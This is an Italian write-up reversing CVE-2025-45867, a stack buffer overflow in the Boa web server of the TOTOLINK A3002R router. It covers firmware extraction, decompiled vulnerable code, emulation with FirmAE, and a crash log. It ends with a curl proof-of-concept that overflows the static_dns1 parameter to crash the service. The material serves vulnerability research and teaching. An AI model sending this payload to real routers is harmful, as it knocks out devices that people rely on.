@@ -1,0 +1,305 @@
+section .INTRODUZIONE
+
+Questo lavoro nasce dall'idea di affrontare una CVE non soltanto dal punto di vista della sua riproduzione, ma attraverso un vero e proprio processo di reversing della vulnerabilità.
+
+L'analisi parte dalla CVE-2025-45867, relativa al router TOTOLINK A3002R e a un buffer overflow presente nella gestione delle richieste HTTP del web server embedded. A partire dalle informazioni disponibili sulla vulnerabilità, l'obiettivo è stato ricostruire il percorso tecnico che conduce dalla descrizione della CVE al difetto concreto presente nel firmware.
+
+Il lavoro è stato quindi sviluppato secondo un approccio progressivo. In una prima fase è stato analizzato il firmware a freddo, procedendo con l'estrazione dell'immagine, l'identificazione dell'architettura e la separazione dei componenti principali, fino ad arrivare all'individuazione del kernel Linux e del filesystem userspace. Successivamente, attraverso l'analisi statica del binario "boa", è stato possibile seguire il percorso di elaborazione della richiesta HTTP e risalire alla funzione responsabile della copia non controllata dei dati ricevuti dall'utente.
+
+La seconda fase ha portato l'analisi dal codice al comportamento reale. Il firmware è stato emulato tramite FirmAE e QEMU, permettendo di interagire con la sua interfaccia web e di inviare una richiesta costruita appositamente per riprodurre la condizione di overflow. L'osservazione del crash e dei registri MIPS ha infine fornito la conferma dinamica che il dato controllato dall'input HTTP raggiunge effettivamente lo stack del processo "boa" e ne provoca la corruzione.
+
+L'obiettivo di questo write-up non è quindi soltanto dimostrare che la CVE è riproducibile, ma mostrare come si può risalire dalla vulnerabilità documentata alla sua implementazione concreta all'interno di un firmware embedded, combinando analisi statica e dinamica.
+
+In questo senso, la CVE diventa il punto di partenza dell'indagine, mentre il vero oggetto del reversing è il percorso che collega l'input controllato dall'attaccante, il codice vulnerabile e la corruzione dello stato del processo.
+
+_Indice:
+
+Introduzione
+Metadati
+Nota metodologica
+Executive Summary
+Descrizione della CVE
+Analisi del firmware
+Analisi statica della vulnerabilità
+Analisi dinamica della vulnerabilità
+Proof of Concept
+Aspetti tecnici rilevanti
+Note finali
+
+section .METADATI
+
+Tipologia: stack buffer overflow in web server embedded (CWE-121)
+CVE: CVE-2025-45867
+Target: TOTOLINK A3002R Ge V4.0.0 build B20230531.1404
+Architettura: MIPS32 little-endian (mipsel)
+Kernel: Linux 3.10.90 (toolchain Realtek MSDK 4.8.5p1)
+Web server: Boa/0.94.14rc21
+Endpoint vulnerabile: /boafrm/formIpv6Setup
+Parametro vulnerabile: static_dns1
+Strumenti: FirmAE (Docker), QEMU (system-mode, mipsel), Burp Suite, nginx (reverse proxy locale), binwalk, radare2, Ghidra, curl, python3 (modulo lzma)
+Famiglia dispositivo: router SOHO TOTOLINK, serie A3002R
+Denominazione interna sessione di analisi: TOTOLINK-A3002R-fw230531
+
+section .NOTA_METODOLOGICA
+
+_Approccio:
+
+L'analisi e' condotta in due fasi separate. Prima l'estrazione e il triage del firmware a freddo, senza emulazione, per identificare kernel, filesystem e architettura. Poi l'emulazione dinamica dell'interfaccia web con FirmAE per riprodurre la CVE in un ambiente controllato.
+
+section .EXECUTIVE_SUMMARY
+
+;il router TOTOLINK A3002R V4, firmware B20230531.1404, espone tramite il web server Boa un endpoint di configurazione IPv6 (/boafrm/formIpv6Setup) che non valida la lunghezza del parametro static_dns1 prima di copiarlo in un buffer a dimensione fissa. Un utente gia’ autenticato (sessionCheck valido) puo’ inviare un valore di static_dns1 sufficientemente lungo per corrompere lo stack del processo boa, causando un crash immediato (SIGSEGV seguito da SIGABRT nel log kernel). La vulnerabilita’ non e’ quindi sfruttabile pre-auth in senso stretto, ma resta significativa: le credenziali di default (admin/admin) sono tuttora diffuse su questa fascia di dispositivi, e un attacco CSRF o una sessione rubata sono vettori sufficienti a raggiungere l’endpoint vulnerabile. La vulnerabilita’ e’ stata riprodotta interamente in emulazione tramite FirmAE, senza hardware fisico, confermando il crash a livello di registri MIPS salvati nello stack frame.
+
+section .DESCRIZIONE_CVE
+
+:CVE-2025-45867 riguarda TOTOLINK A3002R e la gestione lato server del form IPv6 Setup. La classe di vulnerabilita' e' un buffer overflow stack-based classico: il firmware legge il parametro POST static_dns1 senza controllarne la lunghezza e lo copia in un buffer allocato sullo stack della funzione che processa la richiesta. Il web server Boa 0.94.14rc21 e' una versione datata gia' nota in letteratura per problemi simili su altri campi dei form CGI, il che rende plausibile che la stessa base di codice presenti pattern di copia non sicura ripetuti su piu' endpoint.
+
+;l'accesso richiede una sessione amministrativa valida (sessionCheck), quindi la vulnerabilita' non e' pre-auth. Resta comunque significativa perche' le credenziali di default (admin/admin) sono ancora diffuse su questa fascia di dispositivi, e un attacco CSRF o una sessione rubata sarebbero sufficienti a innescarla.
+
+section .ANALISI_FIRMWARE
+
+_Estrazione_immagine:
+
+;il firmware è stato scaricato da questo repositori: https://github.com/Swind1er/Download
+
+;il file distribuito e' TOTOLINK-A3002R-Ge-V4.0.0-B20230531.1404.web. Un primo passaggio con binwalk individua due strutture:
+
+binwalk TOTOLINK-A3002R-Ge-V4.0.0-B20230531.1404.web
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+10264         0x2818          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 7730568 bytes
+2409506       0x24C422        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 4179832 bytes, 1190 inodes, blocksize: 131072 bytes, created: 2038-06-23 19:37:36
+
+;output rilevante: blocco LZMA all'offset 0x2818, dizionario 8 MiB, dimensione decompressa dichiarata 7730568 byte.
+;SquashFS little-endian v4.0 xz-compressed all'offset 0x24C422, dimensione 4179832 byte.
+
+;la presenza di due offset distinti suggerisce due componenti separate nell'immagine: un blob compresso (verosimilmente il kernel) e un filesystem userspace.
+
+;il blocco compreso tra i due offset viene estratto a parte:
+
+dd if=TOTOLINK-A3002R-Ge-V4.0.0-B20230531.1404.web of=lzma_blob bs=1 skip=$((0x2818)) count=$((0x24C422-0x2818))
+
+;isola esattamente il payload LZMA dal resto dell'immagine, usando gli offset ricavati da binwalk come limiti.
+
+;un primo tentativo di decompressione con lo strumento xz fallisce:
+
+xz --format=lzma -dc lzma_blob > kernel.raw
+xz: I dati compressi sono danneggiati
+
+;l'errore non implica necessariamente un blob corrotto; xz e' piu' rigido di un decoder LZMA puro nel gestire byte residui dopo la fine dello stream.
+
+_Verifica_con_python:
+
+import lzma
+data = open("lzma_blob", "rb").read()
+d = lzma.LZMADecompressor(format=lzma.FORMAT_ALONE)
+out = d.decompress(data)
+print(len(out))
+print(d.eof)
+print(len(d.unused_data))
+
+risultato: 
+7730568, True, 1025
+
+;7730568 combacia esattamente con la dimensione decompressa dichiarata nell'header LZMA letto da binwalk.
+;eof=True conferma che lo stream si chiude correttamente.
+;i 1025 byte residui in unused_data sono dati successivi allo stream, non parte del kernel: e' questo il motivo per cui xz si era fermato con errore, non una corruzione reale.
+
+_Determinazione_architettura:
+
+dd if=TOTOLINK-A3002R-Ge-V4.0.0-B20230531.1404.web of=lzma_blob bs=1 skip=$((0x2818)) count=$((0x24C422-0x2818))
+
+;lzma_blob contiene tutto ciò che si trova tra 0x2818 e 0x24C422.
+
+>>> 2399242 - 1025 (unused data)
+2398217
+
+dd if=lzma_blob of=kernel.lzma bs=1 count=2398217
+xz --format=lzma -dc kernel.lzma > kernel2.raw
+
+;il blob estratto tra gli offset 0x2818 e 0x24C422 ha una dimensione complessiva di 2.399.242 byte. La decompressione mediante LZMADecompressor in formato FORMAT_ALONE mostra che lo stream LZMA termina dopo 2.398.217 byte, mentre ulteriori 1.025 byte vengono restituiti come unused_data. Lo stream viene quindi isolato mediante dd, ottenendo kernel.lzma, contenente esclusivamente i 2.398.217 byte effettivamente appartenenti al flusso LZMA. La successiva decompressione produce 7.730.568 byte di dati raw, corrispondenti al blob contenente il kernel Linux.
+
+;il blob decompresso (kernel2.raw) viene rianalizzato con binwalk, che restituisce una stringa di versione kernel:
+
+Linux version 3.10.90 (xibin@localhost.localdomain) (gcc version 4.8.5 20150209 (prerelease) (Realtek MSDK-4.8.5p1 Build 2536)) #1056 Wed May 31 14:14:02 CST 2023
+
+;la data di build (31 maggio 2023) e' coerente con la stringa presente nel nome del firmware, B20230531.1404.
+;la toolchain Realtek MSDK conferma la piattaforma SoC, tipica dei router TOTOLINK di fascia bassa/media.
+
+r2 -a mips -b 32 -e cfg.bigendian=false kernel2.raw
+
+;l'apertura del blob in radare2 con configurazione asm.arch=mips, asm.bits=32, cfg.bigendian=false produce disassemblato coerente a partire dall'offset 0x400:
+
+0x00000400  addiu sp, sp, -0x38
+0x00000404  sw    ra, 0x34(sp)
+0x00000408  sw    s4, 0x30(sp)
+0x0000040c  sw    s3, 0x2c(sp)
+0x00000410  sw    s2, 0x28(sp)
+0x00000414  sw    s1, 0x24(sp)
+0x00000418  sw    s0, 0x20(sp)
+
+;prologue MIPS standard: allocazione stack frame di 0x38 byte e salvataggio dei registri callee-saved (s0-s4) e del return address (ra); pattern tipico di funzione compilata senza ottimizzazioni aggressive.
+
+0x000004f8      00601840       mfc0 t8, t4, 0
+0x00000558      20606041       ei
+
+;piu' avanti nella stessa funzione compaiono istruzioni mfc0 ed ei. La presenza di istruzioni mfc0 e ei, insieme alla stringa di versione Linux precedentemente individuata, è coerente con codice MIPS di basso livello appartenente al kernel o a componenti strettamente legati alla piattaforma.
+
+;mfc0 legge un registro del coprocessore 0 (gestione stato CPU/interrupt); ei abilita gli interrupt; la combinazione e' tipica di codice di basso livello kernel, non di userspace.
+
+;l'analisi non assume che 0x400 sia l'entry point ufficiale del kernel: il dato certo e' che il blob contiene codice MIPS32 little-endian coerente con codice kernel/low-level, confermato dalla stringa di versione Linux trovata in precedenza. Stabilire l'entry point esatto richiederebbe un'analisi ulteriore del formato immagine e del bootloader Realtek, fuori dallo scope di questo write-up.
+
+_Collocazione_della_vulnerabilita':
+
+binwalk -e TOTOLINK-A3002R-Ge-V4.0.0-B20230531.1404.web
+
+;il filesystem SquashFS estratto separatamente contiene lo userspace, incluso il binario boa. La CVE oggetto di questo report vive interamente in userspace, nel binario boa, non nel kernel Linux 3.10.90. Il kernel entra in gioco solo come componente che registra il fatal signal del processo boa al momento del crash.
+
+section .ANALISI_STATICA_VULNERABILITA
+
+;il binario boa è aperto in Ghidra per la decompilazione della funzione che gestisce il form IPv6.
+
+void FUN_0045304c(undefined4 param_1,undefined4 param_2,undefined4 param_3)
+
+{
+  char *pcVar1;
+  char *pcVar2;
+  int iVar3;
+  undefined4 uVar4;
+  int iVar5;
+  undefined4 uVar6;
+  int *piVar7;
+  char cVar8;
+  char acStack_138 [64];
+  char acStack_f8 [64];
+  int aiStack_b8 [16];
+  char acStack_78 [64];
+  int local_38;
+  int local_34 [5];
+
+...
+
+  if (local_34[4] == 0) {
+    if (iVar3 == 1) {
+      pcVar1 = (char *)FUN_0040f2b4(param_1,"static_dns1","");
+      strcpy(acStack_f8,pcVar1);
+      pcVar1 = "static_dns2";
+LAB_00453600:
+      pcVar1 = (char *)FUN_0040f2b4(param_1,pcVar1,"");
+      strcpy(acStack_138,pcVar1);
+    }
+
+
+;FUN_0040f2b4 e' la funzione interna di Boa che estrae il valore di un parametro POST.
+;strcpy copia il parametro "static_dns1" nel buffer param_1 senza controllo di lunghezza.
+
+;il pattern comune alle funzioni di parsing dei form Boa in questo firmware e' quindi: leggere il parametro POST con FUN_0040f2b4, copiarlo con strcpy in un offset fisso di un buffer stack allocato dal chiamante, senza mai confrontare la lunghezza del dato in ingresso con la capacita' residua del buffer.
+
+section .ANALISI_DINAMICA_VULNERABILITA
+
+_Setup_ambiente_di_emulazione:
+
+;l'emulazione usa FirmAE in modalita' Docker:
+
+docker run -it --rm -v /dev:/dev -v ~/FirmAE:/work/FirmAE -v ~/firmware:/work/firmwares --privileged=true --name fwdebug fcore
+
+;--privileged=true e' richiesto perche' FirmAE deve creare interfacce di rete tap e loop device per montare il filesystem estratto.
+;il container monta FirmAE e la cartella dei firmware come volumi, cosi' i risultati (scratch/) restano persistenti sull'host.
+
+;dentro il container:
+
+./run.sh -d TOTOLINK /work/firmwares/TOTOLINK-A3002R-Ge-V4.0.0-B20230531.1404.web
+
+;-d avvia la modalita' debug/manuale di FirmAE; il framework esegue due fasi QEMU in sequenza: una fase "initial" con rete utente virtuale per osservare come il firmware si autoconfigura, e una fase "final" con interfaccia tap reale (tap1_0, container 192.168.0.2, firmware 192.168.0.1)
+
+;l'esito positivo dell'emulazione e' segnalato da una riga di log del tipo:
+
+192.168.0.1 true true 17.46 22.47
+
+;i due valori "true true" indicano rispettivamente esito positivo del ping ICMP e della richiesta HTTP sulla porta 80 verso l'IP emulato: se entrambi sono true il firmware espone rete e web server funzionanti.
+
+_Accesso_alla_UI_via_proxy:
+
+;l'IP emulato (192.168.0.1) coincide con l'IP del mio router fisico, quindi non e' raggiungibile in modo pulito dal browser host. La soluzione adottata e' un reverse proxy nginx dentro il container, con riscrittura del corpo delle risposte per sostituire ogni occorrenza di 192.168.0.1 con l'indirizzo:porta del proxy:
+
+server {
+    listen 8080;
+    location / {
+        proxy_pass http://192.168.0.1;
+        proxy_redirect http://192.168.0.1/ http://172.17.0.2:8080/;
+        proxy_set_header Host 192.168.0.1;
+        proxy_set_header Accept-Encoding "";
+        sub_filter '"192.168.0.1"' '"172.17.0.2:8080"';
+        sub_filter 'http://192.168.0.1' 'http://172.17.0.2:8080';
+        sub_filter '192.168.0.1' '172.17.0.2:8080';
+        sub_filter_once off;
+        sub_filter_types *;
+    }
+}
+
+;proxy_set_header Accept-Encoding "" forza il backend a non comprimere la risposta; senza questa riga sub_filter riceverebbe un body gzip e non troverebbe le stringhe da sostituire, lasciando intatto il redirect verso l'IP reale.
+
+;sub_filter_types * estende la riscrittura a tutti i content-type, necessario perche' la stringa dell'IP compare anche in file .js serviti con mime type diverso da text/html.
+
+<img src="https://spaghetti-hacker.github.io/cvetoto1.png" class="full-img">
+
+<img src="https://spaghetti-hacker.github.io/cvetoto2.png" class="full-img">
+
+_Cattura_sessione_e_invio_payload:
+
+;con Burp Suite in intercettazione (listener 127.0.0.1:8087) viene effettuato login con credenziali di default e catturato il token sessionCheck dalla richiesta POST reale verso /boafrm/formIpv6Setup navigando su Advanced -> IPv6 Setup. Il payload di test satura static_dns1 con una sequenza di byte 'A':
+
+curl -X POST 'http://172.17.0.2:8080/boafrm/formIpv6Setup' -H 'Content-Type: application/x-www-form-urlencoded' -H 'X-Requested-With: XMLHttpRequest' -H 'Referer: http://172.17.0.2:8080/IPv6_Setup.htm' --data 'sessionCheck=<SESSION_TOKEN>&submit-url=%2FIPv6_Setup.htm&wan_enable=1&OriginType=1&static_dns1=AAAA...AAA'
+
+;il campo sessionCheck deve provenire da una sessione autenticata valida e recente: Boa invalida il token dopo logout o timeout, e un token scaduto produce un semplice reject applicativo senza toccare il path vulnerabile.
+
+_Osservazione_del_crash:
+
+;il log seriale QEMU della fase final registra il fault subito dopo l'invio del payload:
+
+caught SIGSEGV, dumping core in /tmp
+[  429.805858] potentially unexpected fatal signal 6.
+[  429.806227] CPU: 0 PID: 659 Comm: boa Not tainted 4.1.17+ #28
+[  429.806462] task: 8edcca28 ti: 8eda8000 task.ti: 8eda8000
+[  429.806698] $ 0   : 00000000 00460cb3 00000000 7775f770
+[  429.807167] $ 4   : 00000293 00000293 00000006 00000000
+[  429.807302] $ 8   : 00000001 0000000a 00000000 ffffffff
+[  429.807426] $12   : 77745000 f0000000 00000001 774715d8
+[  429.807549] $16   : 00000293 7775f770 00000006 77490f70
+[  429.807677] $20   : 41414141 41414141 41414141 004611a8
+[  429.807799] $24   : 77470000 774a1e50
+[  429.807948] $28   : 774ccdb0 7fd6fc50 00490000 7749d354
+[  429.808153] Hi    : 0000007e
+[  429.808226] Lo    : 000032e6
+[  429.808423] epc   : 774a1ec0 0x774a1ec0
+[  429.808515] ra    : 7749d354 0x7749d354
+
+;probabilmente: il programma riceve SIGSEGV, un handler/core dumper lo intercetta, poi il processo termina con abort -> segnale 6 è quello che il kernel logga come fatale.
+;i registri $20-$22 contengono 0x41414141, cioe' quattro byte ASCII 'A' consecutivi (0x41 = 'A'): conferma diretta che il pattern del payload HTTP ha raggiunto e sovrascritto registri salvati sullo stack, non solo un'area di memoria inerte.
+;epc (exception program counter) vale 774a1ec0, un indirizzo nella regione delle librerie condivise (mappate in uno spazio 0x77xxxxxx tipico di MIPS linux con mmap alto): il crash avviene durante l'esecuzione di codice di libreria chiamato da boa, non nel corpo della funzione handler stessa, coerente con un ritorno corrotto (ra) che dirotta l'esecuzione.
+
+;dopo il crash la porta 80 smette di rispondere e il proxy nginx restituisce 502 Bad Gateway alle richieste successive, fino al riavvio di boa da parte del watchdog del firmware.
+
+<img src="https://spaghetti-hacker.github.io/cvetoto3.png" class="full-img">
+
+section .PROOF_OF_CONCEPT
+
+;il PoC completo e' una singola richiesta HTTP POST verso l'endpoint vulnerabile, con sessione amministrativa valida e static_dns1 riempito oltre la capacita' del buffer di destinazione:
+
+curl -X POST 'http://<TARGET>/boafrm/formIpv6Setup' \
+  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
+  -H 'X-Requested-With: XMLHttpRequest' \
+  -H 'Referer: http://<TARGET>/IPv6_Setup.htm' \
+  --data 'sessionCheck=<TOKEN>&submit-url=%2FIPv6_Setup.htm&update=&wan_enable=1&OriginType=1&pppUserName=&pppPassword=admin&dnsMode_P=0&pppoe_dns1=&pppoe_dns2=&pppoeMtu=1492&static_ipv6=&static_gw=&static_dns1=<PATTERN_A_x1377>&static_dns2=&static_mtu=1500&dhcp_ip=%3A%3A&pri_dns=%3A%3A&sec_dns=%3A%3A&dnsMode_D=1&dhcp_dns1=1&DhcpMtu=1500&PreType=0'
+
+;<TOKEN> va sostituito con il sessionCheck catturato da Burp durante una sessione autenticata attiva; <PATTERN_A_x1377> e' la stringa di 1377 caratteri 'A' che ha prodotto il crash osservato nella sezione precedente.
+
+;questo PoC dimostra il denial of service (crash del processo boa) e corruzione confermata di registri salvati; non include ancora un  pattern per il calcolo dell'offset esatto ne' un controllo verificato del return address, passi necessari per trasformare il DoS in RCE.
+
+;verifica dello stato del servizio dopo l'invio:
+
+curl -s -o /dev/null -w '%{http_code}\n' http://<TARGET>/login.htm
+
+;un codice HTTP diverso da 200, o l'assenza di risposta entro timeout, conferma che boa non sta piu' rispondendo sulla porta 80 dopo il payload.
+
